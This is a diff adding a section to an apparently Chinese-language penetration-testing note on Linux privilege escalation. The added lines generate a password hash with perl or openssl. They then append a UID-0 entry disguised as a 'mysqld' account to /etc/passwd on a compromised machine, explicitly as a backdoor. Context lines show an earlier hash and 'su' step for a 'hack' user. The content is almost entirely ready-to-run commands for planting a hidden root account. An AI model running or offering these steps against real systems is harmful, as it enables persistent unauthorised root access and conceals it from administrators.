@@ -107,3 +107,19 @@ hack:$6$hxYB19Bb/77OJemB$PMJiiXKU7y2OLCD5GGO2F1hQwgsSUjEX2FyoUsQhOw4L5WlJ/26EMca
 
 su hack //123
 ```
+
+# 方法二：passwd写入提权
+```c
+1、kali 生成密码  
+perl -e 'print crypt("123456", "AA"). "\n"'
+AASwmzPNx.3sg //密码：123456 ，AA 为盐
+或者
+生成密码： 
+openssl passwd -1 -salt admin 123456 
+-1 的意思是使用md5crypt加密算法 
+-salt 指定盐为admin 123456 明文密码
+2、生成后构造passwd文件中的条目
+mysqld:AASwmzPNx.3sg:0:0:me:/root:/bin/bash
+3、在被控制机器上添加后门
+echo "mysqld:AASwmzPNx.3sg:0:0:me:/root:/bin/bash" >> /etc/passwd
+```
